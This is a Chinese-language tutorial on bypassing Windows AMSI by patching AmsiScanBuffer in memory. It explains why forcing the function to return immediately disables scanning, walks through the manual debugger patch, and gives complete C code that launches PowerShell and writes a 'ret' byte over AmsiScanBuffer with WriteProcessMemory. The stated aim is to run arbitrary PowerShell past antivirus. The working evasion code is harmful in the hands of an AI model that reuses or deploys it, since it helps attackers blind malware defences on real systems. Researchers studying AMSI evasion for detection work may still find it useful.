# 基于内存补丁的AMSI绕过

## AMSI简介

AMSI的全称是反恶意软件扫描接口（Anti-Malware Scan Interface），是从Windows 10开始引入的一种机制。AMSI是应用程序和服务能够使用的一种接口，程序和服务可以将“数据”发送到安装在系统上的反恶意软件服务（如Windows Defender）。

服务和应用程序可以通过AMSI来与系统中已安装的反恶意软件通信。为了完成该任务，AMSI采用了hook方法。比如，AMSI会hook WSH（Windows Scripting Host）及PowerShell来去混淆并分析正在执行的代码内容。这些内容会被“捕获”，并在执行之前发送给反恶意软件解决方案。

在Windows 10上，实现AMSI的所有组件如下所示：

* UAC（用户账户控制），安装EXE、COM、MSI或者ActiveX时提升权限
* PowerShell（脚本、交互式使用以及动态代码执行）
* Windows Script Host（`wscript.exe`或者`cscript.exe`）
* JavaScript以及VBScript
* Office VBA宏

AMSI整体架构如下图所示：

![](../.gitbook/assets/image%20%2832%29.png)

简单的说AMSI就是这玩意:

![](../.gitbook/assets/image%20%2868%29.png)

## 技术原理&流程

根据前人的研究，我们知道字符串是否敏感是由amsi.dll中的AmsiScanBuffer函数来进行判断的，而内存补丁是一种较为便捷的技术，我们可以对这个函数进行修补，使其丧失判断能力，这样我们就能自由执行任意powershell脚本，当然前提是脚本文件没有被杀软干掉。

实现方式有很多种，如注入一个内存修补功能的dll、获取amsiscanbuffer函数地址使用winapi进行修补。

这里我们使用获取函数地址对其进行修补，流程如下：

1. 创建一个powershell进程
2. 获取amsiscanbuffer函数地址
3. 修改函数内存空间属性
4. 修补函数执行体

前面文章有阐述过目前windows不同进程加载同一个系统模块的地址是一致的，所以我们可以使用本地加载dll获取对应函数地址去修补其他进程的该函数。

> 根据微软官方文档，`AmsiScanBuffer`函数应该返回`HRESULT`类型值，这是一个整数值，用来表示操作是否成功。在我们的例子中，如果该函数成功，那么就应当返回`S_OK`（`0x00000000`），否则应该返回`HRESULT`错误代码。
>
> 这个函数的主要功能是返回需要扫描的内容是否存在问题，这也是`result`变量会作为参数传递给`AmsiScanBuffer`函数的原因所在。这个变量的类型为`AMSI_RESULT`枚举类型。
>
> 对应的枚举原型如下所示：
>
> ```text
> typedef enum AMSI_RESULT {
>     AMSI_RESULT_CLEAN,
>     AMSI_RESULT_NOT_DETECTED,
>     AMSI_RESULT_BLOCKED_BY_ADMIN_START,
>     AMSI_RESULT_BLOCKED_BY_ADMIN_END,
>     AMSI_RESULT_DETECTED
> };
> ```
>
> 在函数执行过程中，待分析的内容会被发送到反恶意软件服务，后者会返回`1`到`32762`（含）之间的一个整数。整数值越大，则代表风险越高。如果证书大于或等于`32762`，那么就会将其判断为恶意数据，加以阻止。随后系统会根据返回的整数值来更新`AMSI_RESULT`变量值。
>
> 默认情况下，该变量处于“正常”（“无害”）值状态，因此，如果我们修改了函数指令，使其永远不会将待分析的内容发送给反恶意软件服务，并且返回`S_OK` `HRESULT`结果值，那么这些内容就会被当成无害数据。
>
> 在汇编语言中，`EAX`（32位）以及`RAX`（64位）寄存器始终包含函数的返回值。因此，如果`EAX`/`RAX`寄存器值等于0，并且如果执行了`ret`汇编指令，那么该函数就会返回`S_OK` `HRSULT`，不会将待分析数据发送给反恶意软件服务。

事实上对于字符串的拦截工作是在AmsiScanBuffer函数内完成的,并非在AmsiScanBuffer返回后由其他函数拦截，这也解释了为什么我们直接ret也能绕过AMSI\(此时RAX内存放着AmsiScanBuffer的地址，无论如何也远大于32762\)。

## 手工操作

创建一个powershell进程

![](../.gitbook/assets/image%20%2870%29.png)

调试器附加并定位AmsiScanBuffer函数

![](../.gitbook/assets/image%20%2814%29.png)

修补该函数使其直接返回\(具体细节大家可以使用ida和x64dbg跟一下\)。

![](../.gitbook/assets/image%20%2866%29.png)

![](../.gitbook/assets/image%20%2863%29.png)

绕过AMSI。

![](../.gitbook/assets/image%20%2845%29.png)

## 代码实现

由于powershell版的内存补丁绕过在互联网上到处都是，且有被标黑，这里就不贴出来了\(好吧其实是我懒\)，这里我们其实也有多种实现思路，可以查找运行中的powershell.exe进程来进行修补，也可以自己创建一个新的powershell进程进行修补，这里采用新创建的powershell进行修补。

```text
#include <Windows.h>
#include <stdio.h>

int main() {
	STARTUPINFOA si = {0};
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);

	CreateProcessA(NULL, (LPSTR)"powershell -NoExit dir", NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);

	HMODULE hAmsi = LoadLibraryA("amsi.dll");
	LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");

	Sleep(500);

	DWORD oldProtect;
	char patch = 0xc3;

	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
	WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &patch, sizeof(char),NULL);
	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	FreeLibrary(hAmsi);
	return 0;
}
```

![](../.gitbook/assets/image%20%28113%29.png)

## LINKS

{% embed url="https://www.contextis.com/en/blog/amsi-bypass" %}

{% embed url="https://www.anquanke.com/post/id/168210" %}

{% embed url="https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html" %}

{% embed url="https://www.anquanke.com/post/id/180281" %}



